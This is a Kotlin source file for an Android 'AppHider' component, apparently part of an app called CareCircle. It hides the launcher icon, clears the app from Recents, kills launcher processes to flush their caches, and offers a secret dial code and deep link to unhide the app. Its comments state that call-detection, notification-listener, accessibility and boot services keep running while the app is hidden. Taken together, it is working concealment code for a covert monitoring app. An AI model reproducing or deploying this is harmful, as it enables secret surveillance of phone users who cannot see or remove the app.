package com.example.background

import android.app.Activity
import android.app.ActivityManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * 🫥 AppHider — Robust App Drawer Hiding (Android 7.0 up to Android 16)
 *
 * How it works:
 *  - Uses an <activity-alias> (.LauncherAlias) pointing to .MainActivity
 *  - Hiding toggles ONLY the LauncherAlias component (COMPONENT_ENABLED_STATE_DISABLED)
 *  - MainActivity stays ENABLED at all times:
 *      * Background services (CareCircleForegroundService, CallDetectorService) keep running uninterrupted
 *      * Accessibility Watchdog (AccessibilityWatchdogService) settingsActivity remains valid
 *      * Notification Listener (CareCircleNotificationListener) remains bound
 *      * BootReceiver continues to catch ACTION_BOOT_COMPLETED on restart
 *      * WorkManager periodic jobs continue unaffected
 *      * Deep link "carecircle://open" works from browser
 *      * Dial code *#*#2824#*#* works reliably from dialer
 *      * System never considers the app as "headless" or resets state on Android 13/14/15/16 reboot
 *  - On Android 13+ (API 33+), uses atomic batch API setComponentEnabledSettings() with fallback
 *  - Invalidate OEM launcher caches (Realme UI / ColorOS / MIUI / OneUI) via refreshLauncher()
 *    to flush stale RAM caches instantly without needing a full device restart!
 */
object AppHider {

    private const val TAG = "AppHider"
    const val ALIAS_NAME = "com.example.background.LauncherAlias"
    const val MAIN_ACTIVITY_NAME = "com.example.background.MainActivity"

    /**
     * Hide the app from launcher
     * Returns true if successful
     */
    fun hideApp(context: Context): Boolean {
        return try {
            val packageManager = context.packageManager
            val aliasComponent = ComponentName(context.packageName, ALIAS_NAME)
            val mainComponent = ComponentName(context.packageName, MAIN_ACTIVITY_NAME)

            // Self-heal: ONLY re-enable MainActivity if it was specifically DISABLED by an older build.
            // If it is in COMPONENT_ENABLED_STATE_DEFAULT (0), it is already enabled by the manifest!
            try {
                if (packageManager.getComponentEnabledSetting(mainComponent) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    packageManager.setComponentEnabledSetting(
                        mainComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Log.d(TAG, "Restored MainActivity from disabled state to enabled")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Notice checking MainActivity state: ${e.message}")
            }

            // Compute appropriate flags for Android version:
            // Android 11+ (API 30+) supports PackageManager.SYNCHRONOUS which forces immediate
            // write to disk instead of deferring it until reboot!
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                PackageManager.DONT_KILL_APP or PackageManager.SYNCHRONOUS
            } else {
                PackageManager.DONT_KILL_APP
            }

            // Disable LauncherAlias
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                try {
                    val setting = PackageManager.ComponentEnabledSetting(
                        aliasComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        flags
                    )
                    packageManager.setComponentEnabledSettings(listOf(setting))
                } catch (tiramisuEx: Throwable) {
                    Log.w(TAG, "Tiramisu batch API fallback: ${tiramisuEx.message}")
                    packageManager.setComponentEnabledSetting(
                        aliasComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        flags
                    )
                }
            } else {
                packageManager.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    flags
                )
            }

            // Flush PackageManager binder cache
            try {
                val queryIntent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_LAUNCHER)
                    `package` = context.packageName
                }
                packageManager.queryIntentActivities(queryIntent, PackageManager.MATCH_DISABLED_COMPONENTS)
            } catch (_: Exception) {}

            // Immediately invalidate launcher caches so OEM launchers (Realme / ColorOS / MIUI)
            // drop the cached icon right away without waiting for reboot!
            refreshLauncher(context)

            Log.d(TAG, "✅ App hidden from launcher (LauncherAlias disabled)")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to hide app: ${e.message}", e)
            false
        }
    }

    /**
     * Unhide the app (make it visible in launcher again)
     * Returns true if successful
     */
    fun unhideApp(context: Context): Boolean {
        return try {
            val packageManager = context.packageManager
            val aliasComponent = ComponentName(context.packageName, ALIAS_NAME)
            val mainComponent = ComponentName(context.packageName, MAIN_ACTIVITY_NAME)

            // 1. Ensure MainActivity is enabled if previously disabled
            try {
                if (packageManager.getComponentEnabledSetting(mainComponent) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    packageManager.setComponentEnabledSetting(
                        mainComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
            } catch (e: Exception) {
                Log.w(TAG, "Notice enabling MainActivity: ${e.message}")
            }

            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                PackageManager.DONT_KILL_APP or PackageManager.SYNCHRONOUS
            } else {
                PackageManager.DONT_KILL_APP
            }

            // 2. Enable LauncherAlias
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                try {
                    val setting = PackageManager.ComponentEnabledSetting(
                        aliasComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        flags
                    )
                    packageManager.setComponentEnabledSettings(listOf(setting))
                } catch (tiramisuEx: Throwable) {
                    Log.w(TAG, "Tiramisu batch API fallback: ${tiramisuEx.message}")
                    packageManager.setComponentEnabledSetting(
                        aliasComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        flags
                    )
                }
            } else {
                packageManager.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    flags
                )
            }

            // Flush PackageManager binder cache
            try {
                val queryIntent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_LAUNCHER)
                    `package` = context.packageName
                }
                packageManager.queryIntentActivities(queryIntent, PackageManager.MATCH_ALL)
            } catch (_: Exception) {}

            // Refresh launcher so icon shows up immediately
            refreshLauncher(context)

            Log.d(TAG, "✅ App unhidden — visible in launcher (LauncherAlias enabled)")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to unhide app: ${e.message}", e)
            false
        }
    }

    /**
     * Check if app is currently hidden from launcher
     */
    fun isHidden(context: Context): Boolean {
        return try {
            val packageManager = context.packageManager
            val aliasComponent = ComponentName(context.packageName, ALIAS_NAME)
            val mainComponent = ComponentName(context.packageName, MAIN_ACTIVITY_NAME)

            val aliasState = packageManager.getComponentEnabledSetting(aliasComponent)
            val mainState = packageManager.getComponentEnabledSetting(mainComponent)

            // Hidden if LauncherAlias is disabled, or if legacy MainActivity was disabled
            aliasState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                mainState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Log.e(TAG, "❌ isHidden check failed: ${e.message}")
            false
        }
    }

    /**
     * Invalidate OEM home screen launcher cache (Realme UI / ColorOS / MIUI / Samsung One UI).
     * These launchers cache the app drawer list in RAM. By terminating their background process,
     * the system restarts the launcher, forcing an instant rebuild of its app drawer database
     * without needing a phone restart!
     */
    fun refreshLauncher(context: Context) {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager ?: return

            val packagesToKill = mutableSetOf<String>()

            // 1. Resolve current default home launcher package
            try {
                val homeIntent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
                val resolveInfo = context.packageManager.resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY)
                val defaultLauncher = resolveInfo?.activityInfo?.packageName
                if (!defaultLauncher.isNullOrBlank() && defaultLauncher != context.packageName) {
                    packagesToKill.add(defaultLauncher)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error resolving default launcher: ${e.message}")
            }

            // 2. Add known OEM launcher packages
            packagesToKill.addAll(listOf(
                "com.oppo.launcher",
                "com.realme.launcher",
                "com.coloros.launcher",
                "com.heytap.launcher",
                "com.android.launcher",
                "com.android.launcher3",
                "com.sec.android.app.launcher",
                "com.miui.home",
                "com.google.android.apps.nexuslauncher"
            ))

            for (pkg in packagesToKill) {
                try {
                    am.killBackgroundProcesses(pkg)
                    Log.d(TAG, "🔄 Invalidated launcher cache for: $pkg")
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.w(TAG, "refreshLauncher failed: ${e.message}")
        }
    }

    /**
     * Cleanly exit app to home screen, clear task from Android Recents, and refresh launcher.
     */
    fun exitToHomeAndClearRecents(activity: Activity) {
        try {
            // First refresh launcher
            refreshLauncher(activity)

            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
            }
            activity.startActivity(homeIntent)
            activity.finishAndRemoveTask()
            Log.d(TAG, "✅ Navigated to home and removed task from recents")

            // Delayed refresh so that when launcher resumes, its cache is clean
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    refreshLauncher(activity.applicationContext)
                } catch (_: Exception) {}
            }, 300)
        } catch (e: Exception) {
            Log.e(TAG, "Failed exitToHomeAndClearRecents: ${e.message}")
            activity.finishAffinity()
        }
    }

    /**
     * Get the secret dial code (for display in UI)
     */
    const val SECRET_CODE = "2824"

    /**
     * Get formatted secret code for UI display
     */
    val SECRET_CODE_FORMATTED: String = "*#*#2824#*#*"

    /**
     * Get URL scheme for backup unhide
     */
    const val URL_SCHEME = "carecircle://open"
}
